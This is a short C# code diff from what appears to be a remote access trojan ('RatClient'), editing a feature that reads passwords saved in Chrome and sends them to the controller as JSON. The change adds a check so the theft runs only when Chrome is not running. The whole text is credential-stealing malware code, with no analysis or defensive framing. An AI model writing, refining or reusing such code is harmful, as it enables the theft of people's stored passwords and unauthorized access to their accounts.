@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Web.Script.Serialization;
+using System.Diagnostics;
 using RatClient.Features.Password.Chrome;
 
 namespace RatClient.Features
@@ -24,9 +25,17 @@ namespace RatClient.Features
         }
         public void SendPasswords()
         {
-            var passwords = chrome.ReadPasswords();
-            var serializedPasswords = new JavaScriptSerializer().Serialize(passwords);
-            SendJson(new { type = "passwords", data = serializedPasswords });
+            if (!IsChromeRunning())
+            {
+                var passwords = chrome.ReadPasswords();
+                var serializedPasswords = new JavaScriptSerializer().Serialize(passwords);
+                SendJson(new { type = "passwords", data = serializedPasswords });
+            }
+        }
+        private bool IsChromeRunning()
+        {
+            Process[] chromeProcesses = Process.GetProcessesByName("chrome");
+            return chromeProcesses.Length > 0;
         }
     }
 }
